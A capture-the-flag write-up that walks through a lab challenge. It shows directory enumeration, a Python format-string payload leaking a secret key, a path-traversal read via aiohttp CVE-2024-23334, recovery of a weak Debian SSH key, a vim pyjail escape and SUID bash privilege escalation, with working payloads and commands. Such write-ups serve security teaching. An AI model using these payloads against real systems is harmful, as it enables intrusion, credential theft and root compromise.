# something


Proposed difficulty: hard

Jeg har lavet en lille something something til dig <3

[http://something.hkn](http://something.hkn)


# Solution

1) Get source code

    Use `dirbuster` or `gobuster` to find the endpoint `/FireFox_Reco` (`directory-list-2.3-medium.txt` can be used):

    ```bash
    docker run --rm --network="host" -v ~/Downloads:/wordlists ghcr.io/oj/gobuster dir -u http://localhost:8000 -w /wordlists/directory-list-2.3-medium.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://localhost:8000
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /wordlists/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /static               (Status: 403) [Size: 14]
    /FireFox_Reco         (Status: 200) [Size: 34]
    /read                 (Status: 200) [Size: 13]
    ```

    **NOTE**: If using dirbuster you most likely have to use the `url fuzz` instead of `standard start point` option against `/{dir}`!!!!!!!!!

    Visiting `/FireFox_Reco ` tells us to visit `/somethingsomethingsomething`, which will download a zip of the source code!.


2) Understanding source code

    Reading `app.py` one should become aware of two things 1) We can access `/static/` if we  can somehow read the `KEY` value in the `CONFIG` object

    ```python
    CONFIG = {
        "KEY": "REDACTED"
    }
    ```
    And that there is some a funky class and method:

    ```python
    class SecretInfo:
    def __init__(self, something):
        self.something = something

    def get_secret(avatar_str, people_obj):
    return avatar_str.format(people_obj = people_obj)
    ```

    And 2) Realize that in the `requirements.txt` the `aiohttp` version is `3.9.1`, which is vulnerable to LFI (CVE-2024-23334) using the symlinked endpoint `/static`

3) Get cookie

    The `get_secret` function formats a string:

    ```python
    def get_secret(avatar_str, people_obj):
    return avatar_str.format(people_obj = people_obj)
    ```

    Looking up this function on google looks very similar to this [function](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-format-string). `query_param` is user supplied:

    ```python
    async def read(request):
        cookie = request.cookies.get('cookie', None)

        query_param = request.rel_url.query.get("q", "default_value")

        secret_obj = SecretInfo("SECRET")

        secret = get_secret(query_param, people_obj = secret_obj)
    ```

    This means that we can read the `KEY` value by using a format string by using read gadgets to read the global object `CONFIG` with the following payload.

    ```
    {people_obj.__init__.__globals__[CONFIG][KEY]}
    ```

    We now get that the cookie value should be `00aef67d6df7fdee0419aa3713820e7084cbcb8b8f7c47efe028e3bd9d82e7e5` by visiting `something.hkn/read?q={people_obj.__init__.__globals__[CONFIG][KEY]}`. Set the cookie in your browser to the name `cookie` and the value `00aef67d6df7fdee0419aa3713820e7084cbcb8b8f7c47efe028e3bd9d82e7e5`.


4) Use LFI to get `authorized_keys`

    As mentioned earlier the specific version of `aiohttp` is `3.9.1` which is vulnerable to `CVE-2024-23334`. 

    Looking at the source code supplied, one file that stands out in particular is the `authorized_keys` file that is copied into the docker container.

    The source code has set `/static` to follow symlinks:

    ```python
    app.router.add_routes([
        web.static("/static", "static/", follow_symlinks=True),
    ])
    ```

    Therefore we can use the CVE-2024-23334. Using the payload `something.hkn/static/../../../../home/bruhbruh/.ssh/authorized_keys` we get a public key for SSH (I **HIGHLY** suggest using burp suite for this - Might be issues with cookies!):

    ```
    ssh-rsa AAAAB3NzaC1yc2EAAAABIwAABAEAvvxMe5ZPIXIDGHIa8RFUcyecR2i39ygfepJLc4PkC78JDlvGNwlsIETuL81VnFgur14JqXby41HPv2ESgNHEmcZrSlD3rv8lg+5MoqK7ptK/VhZK3/13e0WW1lKkVjqvRq5mErfefeQOCwr50U8SGKO5TDuPe4/EtgLBmNei+6fuDH4J1tLcPNAOTIiCd1bnsAhI2+YwN7skqiGhl2llkPgS8Y+f7CkrCdN/2TbNYucRlmFdvZkUgVZKt4i7qe5IXekYYIlfk2DYdb0siTXC+C9J38rQUwx9sCRalNh46Y1ctzBIxGLKfmz5ZVZdKGIu+zEOLCFvfmWkI9OYGHRgjcVhvjxAyqCajhCu7jd1Pns7gO1gIHUtn8VEvQ+yR2lMBFbm9ODt/wH5pMWmbfvcVAmZEvSXvtsxX6tUl1WCDOr9DOHG3OMG6sEZ5n1HQ/G1QRRah5MIBAEQW3w1nSioB+1KLok+Mm0sKewAVK/ymscoCUyHD8X7qz50UcwB+IgfSfW/5PfGKxLultZZ/fr+Uh0g8D8VEqr2Qj2LXrRL05WjddBLKU2xgPukN8n8HulUYPumqC4P5VEnroJWGjblirQp5c4p2toWQ9wCzm+YGclSmaao5jqwbm+k5LM7T8C/JXSmHbCgkhPja+Ixr5ngQVQ8tfU/GEvtq43YhycPZ4FKQ3hyvkbN2h0+Qhoo5sHqLn3iZUMxGHsD0KrcLbsiOnAftFgbVwSy0/FI+AJ9iODGlObId1deJ4He6JZNoF4G+yq0FjGl5yDARGZVG3dszOhOe6c0uKS24q7FF61JU7PsdOn5OxueMo7o78ZTLnPcFiH/3bx0dxAieAYV1CiwO4c58tQjTJNx2FLi5tyU2pXXPQUKXzkQp1eXKIgJyTvhbdn0C8mzucstZ5piipdnUXT7zHv9OLyctbknk10gw5lT7NJSthJbcqjnDl0n6orFzhAy9o2EHqi9YNHJvNRCg5OOZfEKZEjKTDeG4EM7bK7/jH5edO0YpyY5q0pVI3KyRgkFCo0qkbENIxiLvNkuagmNQW5pfz6LLceT4ynKo7bS6QnwYhtgBonLVYAbNSoEYSHfWkRkSasVW9eGCETFxdkRQZo5SjpBa8CRDTS5xE+T279bcy7/TBj6AtaikR1ovuybvZbOYE8cSFrX6ZriiFQxsiSceKzJfN+jn1clux2UnJXLq3m/MmYeCTBRNNxtij8vns8UbEWFuQ7GPvg7Gs3BnXQIuVVroCIWzMZrLmr/hWzWpCnObJFULytxua5HLdDWOHRTK7O2bENKqRgUiT1MTxCBFQqVUB/Lmj8ZlBOdKZ97zy7ETCv/cbNIHC8DN3Wc0Xd5oNPOM54lkEsRtw== bruhbruh@something.hkn
    ```

5) Figure out what key type is used

    Copy public key to some file that ends with `.pub`, I will use `c0125fdcde2ec2a4f245dabf51e58ba7-4353.pub`, because that is the actual public key file name. 

    To identify the algorithm and how many bits are used you can use:

    ```
    $ ssh-keygen -l -f c0125fdcde2ec2a4f245dabf51e58ba7-4353.pub
    8192 SHA256:0bHHplni+JH38nPjmNFJJTezokFJBihoob0TEWaAjqU root@targetcluster (RSA)
    ```

    So it's a `8192` bit RSA key

6) Get private key

    Using [debian_ssh_rsa_8192_1_4100_x86.tar.bz2](https://github.com/g0tmi1k/debian-ssh/blob/master/uncommon_keys/debian_ssh_rsa_8192_1_4100_x86.tar.bz2) we can find what the corresponding private key is. Firstly extract:
    ```bash
    $ git clone https://github.com/g0tmi1k/debian-ssh
    $ tar jxf debian-ssh/uncommon_keys/debian_ssh_rsa_8192_1_4100_x86.tar.bz2
    ```

    Now using a recursive grep on some of the characters in the public key:

    ```bash
    $ grep -lr "AAAB3NzaC1yc2EAAAABIwAABAEAvvxMe5ZPIXIDGHIa8RFUcyecR2i39ygfepJLc4PkC78JDlvGNwlsIETuL81VnFgur14JqXby41HPv2ESgNHEmcZrSlD3rv8lg+5MoqK7ptK/VhZK3/13e0WW1lKkVjqvRq5mErfefeQOCwr50U8SGKO5TDuPe4/EtgLBmNei+6fuDH4J1tLcPNAOTIiCd1bnsAhI2+YwN7skqiGhl2llkPgS8Y+f7CkrCdN/2TbNYucRlmFdvZkUgVZKt4i7qe5IXekYYIlfk2DYdb0siTXC+C9J38rQUwx9sCRalNh46Y1ctzBIxGLKfmz5ZVZdKGIu+z"
    c0125fdcde2ec2a4f245dabf51e58ba7-4353.pub
    ```

    Now the private key is then `c0125fdcde2ec2a4f245dabf51e58ba7-4353`, download the private key from `/sol`
    
7) SSH login
    
    From the dockerfile it is clear that we have to login into the user `bruhbruh`. Using the private key to login:

    ```bash
    $ ssh -i c0125fdcde2ec2a4f245dabf51e58ba7-4353 bruhbruh@something.hkn
    ```

8) Pyjail
    When getting access to the SSH server you get put directly into a pyjail. From the source code we get `pyjail.py`, where a lot of programs are blacklisted:

    ```python
    banned_commands = {"ls", "pwd", "whoami", "uname", "ps", "grep", "ssh", "systemctl", "cd", "cat", "su", "bash", "echo", "python3", "python", "bin", "exit", "wget", "id"}
    ```

    There are many ways to escape it, but one easy way is to use `vim` and use the options:

    ```
    :set shell=/bin/sh
    :shell
    ```

    **NOTE**: If you have never used vim before then make sure to press `esc` before writing anything! You have to be in command mode to run these commands!

9) Priv esc

    Bash has SUID, so become root by running:

    ```bash
    $ bash -p
    # cat /root/flag.txt
    DDC{1_h4v3_4_l177l3_50m37h1n6_50m37h1n6_f0r_y0u}

